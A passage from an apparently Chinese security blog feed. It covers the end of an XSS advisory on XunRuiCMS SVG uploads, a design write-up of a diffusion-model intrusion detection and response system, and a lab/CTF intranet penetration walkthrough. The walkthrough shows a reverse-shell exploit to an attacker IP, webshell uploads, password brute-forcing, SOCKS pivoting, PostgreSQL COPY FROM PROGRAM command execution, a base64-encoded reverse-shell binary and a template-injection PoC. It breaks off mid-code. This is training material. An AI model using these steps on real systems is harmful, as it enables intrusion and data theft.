id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>This vulnerability allows attackers to:</p><ol><li>Execute arbitrary JavaScript code in the context of other users’ browsers</li><li>Steal sensitive information such as session cookies</li><li>Perform actions on behalf of the victim</li><li>Potentially escalate to more severe attacks</li></ol><h2 id="Vulnerable-Code-Analysis"><a href="#Vulnerable-Code-Analysis" class="headerlink" title="Vulnerable Code Analysis"></a>Vulnerable Code Analysis</h2><p>The vulnerability exists in the <code>dayrui/Fcms/Library/Upload.php</code> component, which fails to properly sanitize SVG files before accepting them for upload. The component only checks for explicit <code>&lt;script&gt;</code> tags but does not handle other JavaScript execution vectors like event handlers (<code>onerror</code>, <code>onload</code>, etc.) that can be used within SVG elements.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>To fix this vulnerability, the application should:</p><ol><li>Implement proper validation and sanitization of SVG files in the <code>Upload.php</code> component</li><li>Consider using a Content Security Policy (CSP) to prevent execution of inline scripts</li><li>Convert SVG files to other image formats (like PNG) during the upload process</li><li>Apply SVG-specific sanitization to remove potentially dangerous attributes and elements</li><li>Update the validation routine to check for event handlers and other JavaScript execution vectors</li></ol><h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><ul><li><strong>2025-08-18</strong>: Vulnerability discovered</li><li><strong>2025-08-18</strong>: Documentation and proof of concept created</li><li><strong>[Future Date]</strong>: Vulnerability reported to vendor</li><li><strong>[Future Date]</strong>: CVE assigned</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/script#Security_considerations">SVG Security Considerations</a></li><li><a href="https://github.com/dayrui/xunruicms">XunRuiCMS GitHub Repository</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞挖掘</tag>
      
      <tag>CVE</tag>
      
      <tag>XSS</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于深度学习的流量检测和响应系统</title>
    <link href="/2025/08/16/%E5%9F%BA%E4%BA%8E%E6%89%A9%E6%95%A3%E6%A8%A1%E5%9E%8B%E7%9A%84%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%92%8C%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F/"/>
    <url>/2025/08/16/%E5%9F%BA%E4%BA%8E%E6%89%A9%E6%95%A3%E6%A8%A1%E5%9E%8B%E7%9A%84%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E5%92%8C%E5%93%8D%E5%BA%94%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="📋-项目概述"><a href="#📋-项目概述" class="headerlink" title="📋 项目概述"></a>📋 项目概述</h2><p>系统是一个端到端的SOAR（安全编排、自动化与响应）平台，核心采用扩散概率模型作为检测引擎，结合事件驱动微服务架构和可视化工具。整体分为五层结构，包括流量采集与预处理、深度异常检测引擎、SOAR核心控制层、溯源分析与攻击链重建层，以及响应剧本与配置管理。通过Kafka事件总线串联各模块，实现松耦合和高扩展性。</p><span id="more"></span><h2 id="🎯-项目背景"><a href="#🎯-项目背景" class="headerlink" title="🎯 项目背景"></a>🎯 项目背景</h2><p>在网络安全领域，随着威胁的复杂化，我们开发了一个创新的基于扩散模型的网络安全自动化响应系统。该系统聚焦于精准检测、快速响应和可解释溯源，构建从流量采集到自动处置的闭环防护链，帮助企业提升防御效率。</p><h2 id="🏗️-系统架构"><a href="#🏗️-系统架构" class="headerlink" title="🏗️ 系统架构"></a>🏗️ 系统架构</h2><h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a>整体架构</h3><p>系统围绕”检测、分类、响应、溯源”四大目标，构建了一个事件驱动的微服务架构：采集—解析—推理—响应。核心检测器基于改进的扩散模型（DDPM&#x2F;DDIM），结合多分类输出结构和时间嵌入（如TimesNet&#x2F;SCConv），对长短期流量序列进行精细化编码。在训练阶段，仅需标签监督，不依赖异常样本的规则建模。检测结果触发YAML剧本响应，如自动封禁IP或隔离主机，并通过攻击链可视化提升可解释性。平均威胁响应时间（MTTR）压缩至3-4秒。</p><p><img src="/img/image-20250816154811271.png" alt="系统架构图"></p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><h4 id="扩散模型基本原理"><a href="#扩散模型基本原理" class="headerlink" title="扩散模型基本原理"></a>扩散模型基本原理</h4><p>扩散模型通过正向过程逐步添加高斯噪声，使数据趋于纯噪声分布；逆向过程则训练模型去噪重建原始数据。在本系统中，我们将其应用于结构化网络流量：以会话级样本为基础，正向添加噪声，逆向预测噪声成分。同时嵌入分类分支，实现重建与判别的双重目标。</p><h4 id="模型结构设计与模块划分"><a href="#模型结构设计与模块划分" class="headerlink" title="模型结构设计与模块划分"></a>模型结构设计与模块划分</h4><p>采用带分类器头的UNet-DDPM架构：</p><ul><li><strong>特征编码器</strong>：处理80+维流量特征（如包间隔、协议类型）。</li><li><strong>U-Net主干</strong>：多尺度残差块、自注意力机制，执行噪声预测。</li><li><strong>分类器头</strong>：输出九类概率向量（正常+八种攻击）。</li><li><strong>时间嵌入</strong>：引导不同扩散阶段的学习。</li><li><strong>额外模块</strong>：DropPath和Attention，提升深度和跨维度关联。</li></ul><p><img src="/img/image-20250816155010520.png" alt="模型结构图"></p><h4 id="训练策略与损失函数构建"><a href="#训练策略与损失函数构建" class="headerlink" title="训练策略与损失函数构建"></a>训练策略与损失函数构建</h4><p>联合优化重建损失（MSE，衡量噪声预测误差）和分类损失（交叉熵）。整体损失为加权组合：L &#x3D; λ1 * L_recon + λ2 * L_class。适当提高分类权重，提升小类攻击识别。使用SMOTE过采样缓解不平衡，训练在CICIDS2017数据集上进行，AUC从0.65逐步升至0.95，Loss稳定下降。</p><p><img src="/img/image-20250816154942865.png" alt="训练曲线"></p><h4 id="推理机制与多分类判决"><a href="#推理机制与多分类判决" class="headerlink" title="推理机制与多分类判决"></a>推理机制与多分类判决</h4><p>新流量进入后：提取特征向量→执行扩散重建→输出标签、置信度和特征重要性。若为攻击，则触发响应。DDIM加速确保实时性，单GPU吞吐达8000 Flow&#x2F;s。</p><h3 id="软件流程与系统逻辑"><a href="#软件流程与系统逻辑" class="headerlink" title="软件流程与系统逻辑"></a>软件流程与系统逻辑</h3><h4 id="整体软件工作流程"><a href="#整体软件工作流程" class="headerlink" title="整体软件工作流程"></a>整体软件工作流程</h4><ol><li><strong>数据接入</strong>：实时抓包或导入数据集，写入Kafka pcap_topic。</li><li><strong>预处理</strong>：CICFlowMeter解析80+特征，发布至flow_topic。</li><li><strong>模型推理</strong>：订阅flow_topic，调用UNetFC-DDPM，输出写入alert_topic。</li><li><strong>分类与记录</strong>：保存标签、置信度、Grad-CAM&#x2F;Shap值特征重要性。</li><li><strong>安全联动</strong>：匹配YAML剧本，执行防火墙&#x2F;EDR动作，支持回滚。</li><li><strong>可视化</strong>：WebSocket实时刷新告警、攻击链图和报告。</li></ol><h4 id="异步多线程执行机制"><a href="#异步多线程执行机制" class="headerlink" title="异步多线程执行机制"></a>异步多线程执行机制</h4><p>采用线程池：采集线程存入队列，处理线程标准化，推理线程批量处理，响应线程下发命令，前端线程更新界面。确保高并发和稳定性。</p><h3 id="系统功能设计"><a href="#系统功能设计" class="headerlink" title="系统功能设计"></a>系统功能设计</h3><ul><li><p><strong>态势感知</strong>：仪表盘显示安全评分、资源监控和流量趋势。</p><p><img src="/img/image-20250816155052522.png" alt="态势感知仪表盘"></p></li><li><p><strong>告警管理</strong>：展示攻击类型、风险等级，支持状态分类和筛选。</p><p><img src="/img/image-20250816155111493.png" alt="告警管理界面"></p></li><li><p><strong>自动响应</strong>：内置剧本库，支持自定义规则和多级告警。</p><p><img src="/img/image-20250816155120319.png" alt="自动响应配置"></p></li><li><p><strong>可视化分析</strong>：攻击链图、时间线、Shapley值解释。</p><p><img src="/img/image-20250816155133683.png" alt="可视化分析"></p></li><li><p><strong>日志审计</strong>：记录操作日志，支持查询和导出。</p><p><img src="/img/image-20250816155147444.png" alt="日志审计"></p></li><li><p><strong>模型管理</strong>：参数配置、版本切换和状态监控。</p></li><li><p><strong>后端推理</strong>：高并发处理，支持每日数十万条连接。</p></li></ul><h3 id="性能指标与评估"><a href="#性能指标与评估" class="headerlink" title="性能指标与评估"></a>性能指标与评估</h3><p>在CICIDS2017数据集上，九类性能如下：</p><table><thead><tr><th>类别</th><th>精确率</th><th>召回率</th><th>F1分数</th><th>准确率</th></tr></thead><tbody><tr><td>Benign</td><td>0.981</td><td>0.964</td><td>0.980</td><td>0.972</td></tr><tr><td>DDoS</td><td>0.980</td><td>0.952</td><td>0.979</td><td>0.966</td></tr><tr><td>DoS</td><td>0.959</td><td>0.934</td><td>0.957</td><td>0.946</td></tr><tr><td>PortScan</td><td>0.963</td><td>0.934</td><td>0.961</td><td>0.948</td></tr><tr><td>Bot</td><td>0.951</td><td>0.924</td><td>0.949</td><td>0.938</td></tr><tr><td>Brute Force</td><td>0.939</td><td>0.925</td><td>0.938</td><td>0.932</td></tr><tr><td>Web</td><td>0.925</td><td>0.904</td><td>0.923</td><td>0.914</td></tr><tr><td>Heartbleed</td><td>0.910</td><td>0.900</td><td>0.909</td><td>0.905</td></tr><tr><td>Infiltration</td><td>0.914</td><td>0.901</td><td>0.913</td><td>0.908</td></tr></tbody></table><p>平均F1&#x3D;0.948。推理延时2.8ms，吞吐4万条&#x2F;秒。与CNN-1D对比，F1提升2.6%，准确率提升2.5%。</p><h2 id="创新说明"><a href="#创新说明" class="headerlink" title="创新说明"></a>创新说明</h2><p>本系统在多个方面实现了技术突破：</p><ol><li><strong>扩散模型在流量检测的首创应用</strong>：传统模型对小样本攻击（如Heartbleed，原始仅11条）识别差。我们通过噪声引导和去噪过程，提升稀有类别学习，F1&gt;0.90，优于CNN和Tree-based方法。</li><li><strong>噪声增强数据管道</strong>：设计可控噪声注入生成”伪异常”样本，结合多任务损失，提升边界样本鲁棒性。小类召回率提升6.4%。</li><li><strong>训练-测试一体化可视化</strong>：集成Loss&#x2F;AUC曲线、ROC&#x2F;PR图、混淆矩阵，支持实时调优。</li><li><strong>多模型对比框架</strong>：横向评估CNN-1D、LSTM、Random Forest、XGBoost，验证扩散模型优势（Precision 0.953 vs. CNN的0.927）。</li><li><strong>SOAR与微服务深度融合</strong>：Kafka驱动检测到处置闭环，解决”垃圾进垃圾出”问题。MTTR缩短至3-4秒，支持插件化扩展。</li></ol><p>这些创新不仅提升了检测精度和响应效率，还增强了系统的可解释性和实用性，为网络安全提供了新范式。</p><h2 id="💡-总结与心得"><a href="#💡-总结与心得" class="headerlink" title="💡 总结与心得"></a>💡 总结与心得</h2><p>这个项目前前后后花了两个月的时间，从算法设计到模型训练，再到最后的前后端设计都依赖ai编程，但同时对深度学习项目有了一个全新的理解，希望下次在有算法支撑或者理论基础的情况下开发一个更实用的系统。</p>]]></content>
    
    
    <categories>
      
      <category>安全项目</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习</tag>
      
      <tag>安全工具</tag>
      
      <tag>开发实践</tag>
      
      <tag>项目分享</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透2-多网段攻击</title>
    <link href="/2025/06/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F2-%E5%A4%9A%E7%BD%91%E6%AE%B5%E6%94%BB%E5%87%BB/"/>
    <url>/2025/06/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F2-%E5%A4%9A%E7%BD%91%E6%AE%B5%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="内网渗透2-多网段攻击"><a href="#内网渗透2-多网段攻击" class="headerlink" title="内网渗透2-多网段攻击"></a>内网渗透2-多网段攻击</h1><h2 id="ip：10-3-4-97"><a href="#ip：10-3-4-97" class="headerlink" title="ip：10.3.4.97"></a>ip：10.3.4.97</h2><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><h5 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a><span style="color:blue">flag1</span></h5><p>1、先用fscan扫描靶机ip,发现靶机开发22、80，8080，8338端口</p><p><img src="/img/image-20250628174813921.png" alt="端口扫描结果"></p><p>2、用dirsearch对开发靶机进行目录探测</p><p><img src="/img/image-20250628172809482.png" alt="目录探测结果"></p><p>发现<a href="http://10.3.4.97/flag">http://10.3.4.97/flag</a>, 访问拿到第一个flag</p><p><img src="/img/image-20250628173011545.png" alt="获取flag1"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag1</span><span class="hljs-template-variable">&#123;ecbad114509698f68441e45a12baae3e&#125;</span><br></code></pre></td></tr></table></figure><p>与此同时，探测到三个重要的页面，他们分别是</p><p><a href="http://10.3.4.97/admin/">http://10.3.4.97/admin/</a> webutler系统</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20173204.png" alt="webutler系统"></p><p><a href="http://10.3.4.97:8080/?m=login%E4%BF%A1%E5%91%BC%E7%B3%BB%E7%BB%9F">http://10.3.4.97:8080/?m=login信呼系统</a></p><p><img src="/img/image-20250628173431489.png" alt="信呼系统"></p><p><a href="http://10.3.4.97:8338/">http://10.3.4.97:8338/</a> maktrail系统</p><p><img src="/img/image-20250628174440945.png" alt="maktrail系统"></p><h3 id="二、外围打点"><a href="#二、外围打点" class="headerlink" title="二、外围打点"></a>二、外围打点</h3><h5 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a><span style="color:blue">flag4</span></h5><h4 id="1、现成poc打maktrail系统"><a href="#1、现成poc打maktrail系统" class="headerlink" title="1、现成poc打maktrail系统"></a>1、现成poc打maktrail系统</h4><p>①我们先打maktrail系统，利用网上已有的poc夺取反弹shell，其中<strong>192.168.192.26</strong>为攻击机ip</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/exploit.sh -t http:/</span><span class="hljs-regexp">/10.3.4.128:8338/</span> -i <span class="hljs-number">192.168</span>.<span class="hljs-number">192.26</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628175504160.png" alt="执行poc脚本"></p><p>②监听本机4444端口，我们拿到反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628180044504.png" alt="获取反弹shell"></p><p>③拿shell后在根目录下夺取flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag4</span><span class="hljs-template-variable">&#123;cfb82c9b5e325f52eba1beb8a4eb3088&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628180341177.png" alt="获取flag4"></p><h5 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a><span style="color:blue">flag3</span></h5><h4 id="2、利用文件上传打信呼系统"><a href="#2、利用文件上传打信呼系统" class="headerlink" title="2、利用文件上传打信呼系统"></a>2、利用文件上传打信呼系统</h4><p>①burpsuite开启代理，在后台任一文件上传一句话木马时抓取数据包</p><p><img src="/img/image-20250628181658928.png" alt="抓取上传数据包"></p><p>②我们发包到重放器进行发送观察页面回显</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20181828.png" alt="分析响应数据"></p><p>我们发现两个关键信息：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-string">&quot;filepath&quot;</span>:<span class="hljs-string">&quot;upload<span class="hljs-char escape_">\/</span>2025-06<span class="hljs-char escape_">\/</span>29_02184430.uptemp&quot;</span><br><span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-number">14</span><br></code></pre></td></tr></table></figure><p>③访问拼接好的url路径,发现是一串字符编码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.3.4.97:8080</span>/upload/<span class="hljs-number">2025</span>-<span class="hljs-number">06</span>/<span class="hljs-number">29</span>_02184430.uptemp<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628183541047.png" alt="访问上传文件"></p><p>④根据”id”:14，我们先访问</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.3.4.97:8080</span>/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="hljs-number">14</span><br></code></pre></td></tr></table></figure><p>再将上一步url的uptemp改为php,成功访问到我们上传的文件</p><p><img src="/img/image-20250628184429281.png" alt="访问PHP文件"></p><p>⑤最后我们利用蚁剑连接，夺取webshell</p><p><img src="/img/image-20250628184603791.png" alt="获取webshell"></p><p>拿到flag3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag3</span>&#123;<span class="hljs-number">37892981</span>a75e4bfcee6343a7d8b4188d&#125;<br></code></pre></td></tr></table></figure><h5 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a><span style="color:blue">flag2</span></h5><p>3、最后我们利用弱密码爆破和文件上传打webutler</p><p>①在登录入口我们可以利用burpsuite进行弱密码爆破</p><p>我们先设置载荷，并且加载playload</p><p><img src="/img/image-20250628185926116.png" alt="设置爆破载荷"></p><p>②成功爆出账号密码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span>:<span class="hljs-keyword">admin</span>         <span class="hljs-keyword">password</span>：Aa123456<br></code></pre></td></tr></table></figure><p><img src="/img/9c4c4f0a7cdf60ef81ae8d9068aae767_.png" alt="成功爆破密码"></p><p>③我们利用爆出的账号密码登录，并在管理系统中找到文件上传执行处，我们上传一句话木马</p><p><img src="/img/image-20250628190422345.png" alt="上传一句话木马"></p><p>④利用蚁剑连接一句话木马，实现漏洞利用，成功找到flag</p><p><img src="/img/image-20250628190613545.png" alt="获取flag2"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag2</span><span class="hljs-template-variable">&#123;e7c3493d2afce1a12b455fa43f3772ed&#125;</span><br></code></pre></td></tr></table></figure><h3 id="三、横向移动及内网穿透"><a href="#三、横向移动及内网穿透" class="headerlink" title="三、横向移动及内网穿透"></a>三、横向移动及内网穿透</h3><h5 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a><span style="color:blue">flag5</span></h5><p>1、在前面的三台服务器中我们选信呼作为跳板机，先将fscan和代理工具agent通过蚁剑上传到服务器</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20190956.png" alt="上传工具"></p><p>2、在蚁剑终端我们发现一个配置文件，里面数据库配置信息及其所在内网的ip信息</p><p><img src="/img/image-20250628191359694.png" alt="查看配置文件"></p><p>里面包含了数据库名和密码，以及关键的数据库地址<strong>10.1.1.22</strong></p><p>3、随后我们可以利用上传的fscan对数据库地址所在的网段进行扫描，得到内网网段信息</p><p>先对fscan赋予可执行权限，再执行扫描命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nohup</span> ./fscan -h <span class="hljs-number">10.1.1.0</span>/<span class="hljs-number">24</span> -np -nopoc -nobr<br></code></pre></td></tr></table></figure><p>扫描结果如下</p><p><img src="/img/image-20250628191742959.png" alt="扫描内网网段"></p><p>我们发现了mysql服务和postgres服务</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">mysq<span class="hljs-variable">l:10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">22</span>:<span class="hljs-number">3306</span> <span class="hljs-keyword">open</span><br>postgre<span class="hljs-variable">s:10</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">44</span>:<span class="hljs-number">5432</span> <span class="hljs-keyword">open</span><br></code></pre></td></tr></table></figure><p>4、随即我们开始进行内网穿透，首先是通过上传到服务器的agent配置服务端代理，执行命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nohup</span> ./agent_linux_x64 -rhost <span class="hljs-number">192.168.207.115</span> -rport <span class="hljs-number">10081</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628192634710.png" alt="配置服务端代理"></p><p><strong>192.168.207.115</strong>是攻击ip,<strong>10081</strong>是转发端口。</p><p>5、紧接着，我们通过admin.exe在本机配置客户端</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">admin</span>.exe -l<span class="hljs-keyword">port</span> 10081<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628193010172.png" alt="配置客户端"></p><p>发现客户端服务端成功连接了</p><p>6、为了在本机访问内网的相关服务，我们还需要proxifiler配置socks5代理</p><p>先是配置代理服务，将信息转发到本机<strong>1080</strong>端口</p><p><img src="/img/image-20250628193324888.png" alt="配置代理服务"></p><p> 再配置代理的规则，将10.1.1.0&#x2F;24网段的所有服务流量转发到本机</p><p><img src="/img/image-20250628193420448.png" alt="配置代理规则"></p><p>最后我们在<strong>本地开启一个监听端口 1080 的 SOCKS5 代理</strong>，这个代理会把所有流量通过 node 1 这个被控主机转发出去。</p><p><img src="/img/image-20250628193823030.png" alt="开启SOCKS5代理"></p><p>到这里整个内网穿透搭建完毕</p><p>7、我们通过图形化工具dbeaver远程连接mysql服务，通过前面拿到的mysql配置信息进行连接</p><p><img src="/img/image-20250628194203635.png" alt="连接MySQL服务"></p><p>成功在mysql服务中找到flag5</p><p><img src="/img/image-20250628194333333.png" alt="获取flag5"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag5</span><span class="hljs-template-variable">&#123;ba202a17b7c78a10fdcea15db19aa47f&#125;</span><br></code></pre></td></tr></table></figure><h5 id="flag6"><a href="#flag6" class="headerlink" title="flag6"></a><span style="color:blue">flag6</span></h5><p>8、我们通过图形化工具dbeaver远程连接postgres服务，通过前面拿到的postgres配置信息进行连接</p><p><img src="/img/image-20250628194537624.png" alt="连接PostgreSQL服务"></p><p>要对数据库查询进行设置显示所有隐藏的数据库信息，以下是更改配置</p><p><img src="/img/image-20250628194651410.png" alt="更改数据库配置"></p><p>随后我们在postgres服务成功找到flag6</p><p><img src="/img/image-20250628194828892.png" alt="获取flag6"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag6</span>&#123;<span class="hljs-number">131</span>e7a46b27f6bc83bef9ac95e37c2eb&#125;<br></code></pre></td></tr></table></figure><h5 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a><span style="color:blue">flag7</span></h5><p>9、我们利用sql语句执行找到flag7</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> cmd_exec;<br><span class="hljs-keyword">CREATE TABLE</span> cmd_exec(cmd_output text);<br><span class="hljs-keyword">COPY</span> cmd_exec <span class="hljs-keyword">FROM</span> PROGRAM <span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> cmd_exec;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20250628195043038.png" alt="执行SQL语句"></p><h3 id="四、扩大攻击面"><a href="#四、扩大攻击面" class="headerlink" title="四、扩大攻击面"></a>四、扩大攻击面</h3><h5 id="flag8"><a href="#flag8" class="headerlink" title="flag8"></a><span style="color:blue">flag8</span></h5><p>1、我们想要夺取postrges的webshell，首先需要构造poc防止绕过，首先生成base64编码的恶意代码</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20230103.png" alt="生成base64编码"></p><p>2、以下是我们通过sql语句构造的poc代码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> cmd_exec;<br><span class="hljs-keyword">CREATE TABLE</span> cmd_exec(cmd_output text);<br><span class="hljs-keyword">COPY</span> cmd_exec <span class="hljs-keyword">FROM</span> PROGRAM <span class="hljs-string">&#x27;echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoKQVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgAiucCozwdRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+Wg8FSIXAeO3/5g== </span><br><span class="hljs-string">||base64 -d &gt; postgre.sql&amp;&amp;chmod +x postgre.sql&amp;&amp;./postgre.sql&#x27;</span>;<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> cmd_exec;<br></code></pre></td></tr></table></figure><p>随后我们在访问的数据库中执行恶意sql语句</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20230139.png" alt="执行恶意SQL"></p><p>3、我们通过msf监听获得反弹shell</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20233740.png" alt="获得反弹shell"></p><p>4、随后我们继续横向移动，通过msf上传fscan和agent代理工具</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20233802.png" alt="上传工具"></p><p>5、我们利用msf对网段10.3.3.0\24进行扫描得到以下信息</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-28%20233926.png" alt="扫描网段"></p><p>6、接下来我们开始配置代理，得到node1、2，对应socks5 1080、1081</p><p><img src="/img/image-20250629015747227.png" alt="配置代理"></p><p>7、为了在Windows上访问到目的ip和端口服务，我们还需配置proxifier代理，设置虚拟机ip和1081端口</p><p><img src="/img/image-20250629020003097.png" alt="设置Proxifier代理1"></p><p><img src="/img/image-20250629020041080.png" alt="设置Proxifier代理2"></p><p>最终成功访问10.3.3.0&#x2F;24网段的服务器</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-29%20011421.png" alt="成功访问服务器"></p><p>9、通过目录探测我们发现一处文件上传处并获取了<a href="http://www.zip解压后得到main.go/">www.zip解压后得到main.go</a></p><p><img src="/img/image-20250629020423644.png" alt="目录探测结果"></p><p><img src="/img/image-20250629020645208.png" alt="获取main.go"></p><p>对源码进行分析，发现存在**exec.Command()**命令执行</p><p>10、由此我们可以实现模板注入，构造以下poc实现查询flag</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;&#123; define &quot;layout&quot; &#125;&#125;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>My Web Page<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br> &#123;&#123; &quot;cat /flag&quot; | result &#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span 